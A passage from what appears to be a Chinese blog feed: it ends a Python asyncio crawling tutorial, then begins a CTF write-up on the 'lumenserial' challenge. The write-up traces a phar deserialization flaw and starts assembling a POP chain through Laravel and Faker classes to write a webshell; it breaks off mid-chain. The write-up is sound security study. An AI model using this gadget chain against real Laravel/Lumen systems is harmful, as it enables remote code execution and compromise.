任务执行完毕<br>任务执行结果为：  任务执行完毕<br>任务执行结果为：  任务执行完毕<br></code></pre></td></tr></table></figure><h2 id="3-协程爬虫"><a href="#3-协程爬虫" class="headerlink" title="3. 协程爬虫"></a>3. 协程爬虫</h2><p>我们日常写爬虫使用的<code>requests</code>库，并不支持异步，协程在本质上运行的时候，整个事件循环还是跑在单线程上的，<code>requests</code>等库在进行网络请求的时候，会将整个线程阻塞，导致事件循环不能继续，也就不能达到协程异步的效果了。</p><h3 id="3-1-使用aiohttp"><a href="#3-1-使用aiohttp" class="headerlink" title="3.1 使用aiohttp"></a>3.1 使用aiohttp</h3><p>不过<code>python</code>中有<code>aiohttp</code>这个库来支持异步爬虫的编写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> aiohttp<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">url</span>):</span><br>    print(<span class="hljs-string">&quot;开始执行爬虫...&quot;</span>,url)<br>    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> aiohttp.ClientSession() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> session.get(url) <span class="hljs-keyword">as</span> resp:<br>            print(resp.url)<br><br>url_list = [<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>,<span class="hljs-string">&quot;https://mengsec.com&quot;</span>]<br><br>tasks = [asyncio.ensure_future(run(url)) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list]<br>loop = asyncio.get_event_loop()<br>loop.run_until_complete(asyncio.wait(tasks))<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">开始执行爬虫... https:<span class="hljs-regexp">//</span>www.baidu.com<br>开始执行爬虫... https:<span class="hljs-regexp">//m</span>engsec.com<br>https:<span class="hljs-regexp">//m</span>engsec.com<br>https:<span class="hljs-regexp">//</span>www.baidu.com<br></code></pre></td></tr></table></figure><h3 id="3-2-使用requests"><a href="#3-2-使用requests" class="headerlink" title="3.2 使用requests"></a>3.2 使用requests</h3><blockquote><p>函数(例如io读写，requests网络请求)阻塞了客户代码与asycio事件循环的唯一线程，因此在执行调用时，整个应用程序都会冻结。这个问题的解决方法是，使用事件循环对象的 run_in_executor方法。asyncio的事件循环在背后维护着一个ThreadPoolExecutor对象，我们可以调用run_in_executor方法，把可调用对象发给它执行。</p></blockquote><p>先看一下官方<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> concurrent.futures<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">blocking_io</span>():</span><br>    <span class="hljs-comment"># File operations (such as logging) can block the</span><br>    <span class="hljs-comment"># event loop: run them in a thread pool.</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/dev/urandom&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read(<span class="hljs-number">100</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cpu_bound</span>():</span><br>    <span class="hljs-comment"># CPU-bound operations will block the event loop:</span><br>    <span class="hljs-comment"># in general it is preferable to run them in a</span><br>    <span class="hljs-comment"># process pool.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(i * i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span> ** <span class="hljs-number">7</span>))<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    loop = asyncio.get_running_loop()<br><br>    <span class="hljs-comment">## Options:</span><br><br>    <span class="hljs-comment"># 1. Run in the default loop&#x27;s executor:</span><br>    result = <span class="hljs-keyword">await</span> loop.run_in_executor(<br>        <span class="hljs-literal">None</span>, blocking_io)<br>    print(<span class="hljs-string">&#x27;default thread pool&#x27;</span>, result)<br><br>    <span class="hljs-comment"># 2. Run in a custom thread pool:</span><br>    <span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor() <span class="hljs-keyword">as</span> pool:<br>        result = <span class="hljs-keyword">await</span> loop.run_in_executor(<br>            pool, blocking_io)<br>        print(<span class="hljs-string">&#x27;custom thread pool&#x27;</span>, result)<br><br>    <span class="hljs-comment"># 3. Run in a custom process pool:</span><br>    <span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor() <span class="hljs-keyword">as</span> pool:<br>        result = <span class="hljs-keyword">await</span> loop.run_in_executor(<br>            pool, cpu_bound)<br>        print(<span class="hljs-string">&#x27;custom process pool&#x27;</span>, result)<br><br>asyncio.run(main())<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">default</span> thread pool b&#x27;\xe<span class="hljs-number">7</span>\xdb+\x<span class="hljs-number">18</span>\xfaB\xfc-\xc<span class="hljs-number">3</span>\x<span class="hljs-number">9</span>c\x<span class="hljs-number">0</span>b<span class="hljs-number">1</span>\xb<span class="hljs-number">8</span>\xbdMw\x<span class="hljs-number">8</span>fK\x<span class="hljs-number">93</span>\x<span class="hljs-number">15</span>Q$\xe<span class="hljs-number">8</span>\xd<span class="hljs-number">8</span>\x<span class="hljs-number">90</span>\xc<span class="hljs-number">1</span>\xce\x<span class="hljs-number">8</span>fB\xb<span class="hljs-number">8</span>\x<span class="hljs-number">1</span>b\x<span class="hljs-number">05</span>\xa<span class="hljs-number">2</span> \x<span class="hljs-number">90</span>\xa<span class="hljs-number">1</span>\x<span class="hljs-number">0</span>cv\xc<span class="hljs-number">9</span>\x<span class="hljs-number">15</span>E\xa<span class="hljs-number">3</span>\x<span class="hljs-number">94</span>\xa<span class="hljs-number">6</span>\xc<span class="hljs-number">8</span>J\xc<span class="hljs-number">9</span>\x<span class="hljs-number">1</span>bP\xed\xc<span class="hljs-number">47</span>\x<span class="hljs-number">7</span>f\x<span class="hljs-number">98</span>,\x<span class="hljs-number">8</span>bc\xb<span class="hljs-number">7</span>\xf<span class="hljs-number">4</span>p<span class="hljs-number">1</span>\xd<span class="hljs-number">6</span>\xb<span class="hljs-number">4</span>p\x<span class="hljs-number">03</span>\xbaQ\xb<span class="hljs-number">0</span>\xbeC\xe<span class="hljs-number">6</span>\x<span class="hljs-number">08</span>\xbb]<span class="hljs-number">0</span>n\xfe<span class="hljs-number">9</span>\xe<span class="hljs-number">96</span>\xaa%\xc<span class="hljs-number">8</span>\x<span class="hljs-number">8</span>f<span class="hljs-number">1</span>\xae\x<span class="hljs-number">92</span>\xde\x<span class="hljs-number">0</span>bv\x<span class="hljs-number">83</span>\x<span class="hljs-number">86</span>\x<span class="hljs-number">0</span>c\xa<span class="hljs-number">1</span>\x<span class="hljs-number">8</span>b\x<span class="hljs-number">1</span>c\xbf\x<span class="hljs-number">16</span>\xdb\xa<span class="hljs-number">7</span>&#x27;<br><span class="hljs-attribute">custom</span> thread pool b&#x27;\xd<span class="hljs-number">8</span>\x<span class="hljs-number">91</span>\x<span class="hljs-number">83</span>N\x<span class="hljs-number">88</span>\xce&gt;\xb<span class="hljs-number">4</span>sPA\xae\xcf\xdd/\x<span class="hljs-number">94</span>j\xdc<span class="hljs-number">1</span>Uj\xf<span class="hljs-number">1</span>P\xfcv\x<span class="hljs-number">84</span>\xf<span class="hljs-number">1</span>\x<span class="hljs-number">90</span>z\x<span class="hljs-number">1</span>a~<span class="hljs-number">8</span>S\x<span class="hljs-number">9</span>e\x<span class="hljs-number">146</span>\xb<span class="hljs-number">7</span>o\xc<span class="hljs-number">0</span>\x<span class="hljs-number">03</span>b\x<span class="hljs-number">1</span>ee\x<span class="hljs-number">18</span>oZ\xeeG\xb<span class="hljs-number">5</span>*S\r\xadu\xc<span class="hljs-number">3</span>\x<span class="hljs-number">8</span>f\\\xb<span class="hljs-number">2</span>q\x<span class="hljs-number">1</span>b\xe<span class="hljs-number">9</span>S&lt;!\xde\xff\x<span class="hljs-number">02</span>\xba\x<span class="hljs-number">03</span>&gt;\xd<span class="hljs-number">4</span>\x<span class="hljs-number">04</span>\x<span class="hljs-number">80</span>\xfa<span class="hljs-number">5</span>\xc<span class="hljs-number">3</span>\x<span class="hljs-number">1</span>a\x<span class="hljs-number">11</span>\xef\xd<span class="hljs-number">4</span>\xef\xd<span class="hljs-number">6</span>^]\x<span class="hljs-number">1</span>dv\x<span class="hljs-number">8</span>eC\x<span class="hljs-number">96</span>t\xcb\xcb:r\x<span class="hljs-number">84</span>\x<span class="hljs-number">1</span>d\xb<span class="hljs-number">5</span>\xecC\\&#x27;<br><span class="hljs-attribute">custom</span> process pool <span class="hljs-number">333333283333335000000</span><br></code></pre></td></tr></table></figure><p>如果我们想在异步爬虫中使用最常用的<code>requests</code>库，可以使用<code>run_in_executor()</code>方法.新建一个线程来执行网络请求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> asyncio<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">url</span>):</span><br>    print(<span class="hljs-string">&quot;开始执行爬虫...&quot;</span>,url)<br>    print(<span class="hljs-string">&quot;开始执行时间：&quot;</span>, time.time())<br>    loop = asyncio.get_event_loop()<br>    response = <span class="hljs-keyword">await</span> loop.run_in_executor(<span class="hljs-literal">None</span>, requests.get, url)<br>    print(response.url)<br>    print(<span class="hljs-string">&quot;结束执行时间：&quot;</span>, time.time())<br>    <br>url_list = [<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>,<span class="hljs-string">&quot;https://mengsec.com&quot;</span>]<br><br>tasks = [asyncio.ensure_future(run(url)) <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list]<br>loop = asyncio.get_event_loop()<br>loop.run_until_complete(asyncio.wait(tasks))<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">开始执行爬虫... https:<span class="hljs-regexp">//</span>www.baidu.com<br>开始执行时间： <span class="hljs-number">1551690906.5337</span><br>开始执行爬虫... https:<span class="hljs-regexp">//m</span>engsec.com<br>开始执行时间： <span class="hljs-number">1551690906.534755</span><br>https:<span class="hljs-regexp">//</span>www.baidu.com/<br>结束执行时间： <span class="hljs-number">1551690906.618516</span><br>https:<span class="hljs-regexp">//m</span>engsec.com/<br>结束执行时间： <span class="hljs-number">1551690908.009247</span><br></code></pre></td></tr></table></figure><p>从输出来看，<code>requests</code>库的网络请求成功异步执行了。</p><p>在后面，我们就可以借助<code>run_in_executor()</code>来使用一些常用的但不支持异步的库来实现自己的目的了。</p><h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014317793224211f408912d9c04f2eac4d2af0d5d3d7b2000">https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014317793224211f408912d9c04f2eac4d2af0d5d3d7b2000</a></li><li><a href="http://wiki.jikexueyuan.com/project/explore-python/Advanced-Features/generator.html">http://wiki.jikexueyuan.com/project/explore-python/Advanced-Features/generator.html</a></li><li><a href="https://thief.one/2018/06/21/1/">https://thief.one/2018/06/21/1/</a></li><li><a href="https://yangsoon.github.io/2018/03/16/asyncio-%E5%88%9D%E6%8E%A2/">https://yangsoon.github.io/2018/03/16/asyncio-%E5%88%9D%E6%8E%A2/</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>协程</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从lumenserial中学phar反序列化漏洞</title>
    <link href="/2019/02/27/code-breaking-lumenserial/"/>
    <url>/2019/02/27/code-breaking-lumenserial/</url>
    
    <content type="html"><![CDATA[<p>Code-breaking 中有一道考察phar反序列化漏洞的medium题目——lumenserial，POP链很深，很值得学习。</p><a id="more"></a><h2 id="1-分析过程"><a href="#1-分析过程" class="headerlink" title="1. 分析过程"></a>1. 分析过程</h2><h3 id="1-1-前期准备"><a href="#1-1-前期准备" class="headerlink" title="1.1 前期准备"></a>1.1 前期准备</h3><p>线上环境中，PHP版本为<code>7.2.15</code>，这意味着不能动态调用<code>assert</code>函数。</p><p>还禁用了不少系统函数。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span>,shell_exec,passthru,<span class="hljs-keyword">exec</span>,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,error_log<br></code></pre></td></tr></table></figure><p>拿到源码后，先看一下<code>routes/web.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$router</span>-&gt;get(<span class="hljs-string">&#x27;/server/editor&#x27;</span>, <span class="hljs-string">&#x27;EditorController@main&#x27;</span>);<br><br><span class="hljs-variable">$router</span>-&gt;post(<span class="hljs-string">&#x27;/server/editor&#x27;</span>, <span class="hljs-string">&#x27;EditorController@main&#x27;</span>);<br></code></pre></td></tr></table></figure><p><code>EditorController</code>应该是个关键点，看一下<code>app/Http/Controllers/EditorController.php</code>。</p><p>在类<code>EditorController</code>中有一个<code>doCatchimage()</code>方法，实现了一个远程捕获图片的功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EditorController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doCatchimage</span>(<span class="hljs-params">Request <span class="hljs-variable">$request</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sources</span> = <span class="hljs-variable">$request</span>-&gt;input(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;catcherFieldName&#x27;</span>]);<br>        <span class="hljs-variable">$rets</span> = [];<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sources</span>) &#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$sources</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$url</span>) &#123;<br>                <span class="hljs-variable">$rets</span>[] = <span class="hljs-keyword">$this</span>-&gt;download(<span class="hljs-variable">$url</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> response()-&gt;json([<br>            <span class="hljs-string">&#x27;state&#x27;</span> =&gt; <span class="hljs-string">&#x27;SUCCESS&#x27;</span>,<br>            <span class="hljs-string">&#x27;list&#x27;</span> =&gt; <span class="hljs-variable">$rets</span><br>        ]);<br>    &#125;<br><br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$maxSize</span> = <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;catcherMaxSize&#x27;</span>];<br>        <span class="hljs-variable">$limitExtension</span> = array_map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$ext</span></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> ltrim(<span class="hljs-variable">$ext</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        &#125;, <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;catcherAllowFiles&#x27;</span>]);<br>        <span class="hljs-variable">$allowTypes</span> = array_map(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$ext</span></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;image/<span class="hljs-subst">&#123;$ext&#125;</span>&quot;</span>;<br>        &#125;, <span class="hljs-variable">$limitExtension</span>);<br><br>        <span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$url</span>);<br>        <span class="hljs-variable">$img</span> = getimagesizefromstring(<span class="hljs-variable">$content</span>);<br><br>        <span class="hljs-comment">//省略部分代码......</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，<code>doCatchimage()</code>传入了一个<code>Request $request</code>，然后从中获取<code>$url</code>参数，在没有经过任何处理的情况下传入<code>download()</code>方法中，而且网站本身就是一个富文本编辑器，有上传图片的功能，这样我们可以在<code>$content = file_get_contents($url);</code>处来进行phar反序列化。</p><p>由于版本和配置限制，我们最终的目标，应该构造类似<code>call_user_func_array(&#39;file_put_contents&#39;, [])</code>来写马。</p><h3 id="1-2-POP链构造"><a href="#1-2-POP链构造" class="headerlink" title="1.2 POP链构造"></a>1.2 POP链构造</h3><p><code>phar</code>反序列化的其他条件都满足了，重点就在<code>POP</code>链的构造上。</p><p>在<code>phpggc</code>中。<code>Laravel</code>的一些<code>RCE</code>都是从<code>Illuminate\Broadcasting\PendingBroadcast::__destruct</code>走的，我们也可以以此为出发点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingBroadcast</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$events</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$event</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">Dispatcher <span class="hljs-variable">$events</span>, <span class="hljs-variable">$event</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-variable">$event</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;events = <span class="hljs-variable">$events</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;events-&gt;dispatch(<span class="hljs-keyword">$this</span>-&gt;event);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里<code>Dispatcher</code>是一个接口，因此<code>$events</code>是继承了该接口的类。</p><p><img src="https://image.mengsec.com/code-breaking-lumenserial/1.png" alt="1"></p><p>只有这两个类继承了<code>Dispatcher</code>，而且它们的<code>dispatch()</code>方法都难以利用。</p><p>只能换个方向，去寻找存在<code>__call()</code>魔术方法的类。</p><blockquote><p><strong>__call()</strong> 在对象中调用一个不可访问方法时调用。<br>该方法有两个参数，第一个参数 <code>$function_name</code> 会自动接收不存在的方法名，第二个 <code>$arguments</code> 则以数组的方式接收不存在方法的多个参数。</p></blockquote><p><img src="https://image.mengsec.com/code-breaking-lumenserial/2.png" alt="2"></p><p><code>vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</code>第52行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-variable">$res</span> = call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;generator, <span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br>        <span class="hljs-variable">$i</span>++;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span> &gt; <span class="hljs-keyword">$this</span>-&gt;maxRetries) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">OverflowException</span>(sprintf(<span class="hljs-string">&#x27;Maximum retries of %d reached without finding a valid value&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;maxRetries));<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (!call_user_func(<span class="hljs-keyword">$this</span>-&gt;validator, <span class="hljs-variable">$res</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类应该满足条件，继续往下分析。</p><p>若是调用类<code>ValidGenerator</code>的<code>__call()</code>方法，<code>$name</code>的值是<code>dispatch</code>，传入的<code>$arguments</code>是一个数组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = call_user_func_array(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;generator, <span class="hljs-variable">$name</span>), <span class="hljs-variable">$arguments</span>);<br></code></pre></td></tr></table></figure><p>继续往下分析，看看能不能完全控制<code>call_user_func_array()</code>的参数，目标是控制<code>$res</code>的值，从而在下面<code>while</code>处完成调用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">while</span> (!call_user_func(<span class="hljs-keyword">$this</span>-&gt;validator, <span class="hljs-variable">$res</span>));<br></code></pre></td></tr></table></figure><p>在<code>ValidGenerator</code>类的构造函数中，传入了<code>Generator</code>类的实例。</p><p><code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><p>因为<code>Generator</code>中没有<code>dispatch</code>方法，所以会调用它的<code>__call()</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;format(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span>, <span class="hljs-variable">$arguments</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;getFormatter(<span class="hljs-variable">$formatter</span>), <span class="hljs-variable">$arguments</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;providers <span class="hljs-keyword">as</span> <span class="hljs-variable">$provider</span>) &#123;<br>        <span class="hljs-keyword">if</span> (method_exists(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>)) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>);<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">InvalidArgumentException</span>(sprintf(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="hljs-variable">$formatter</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，在<code>Generator</code>类中嵌套调用<code>Generator</code>类，实现返回任意类的功能。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$g2</span>-&gt;formatters = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;mengchen&#x27;</span> =&gt; <span 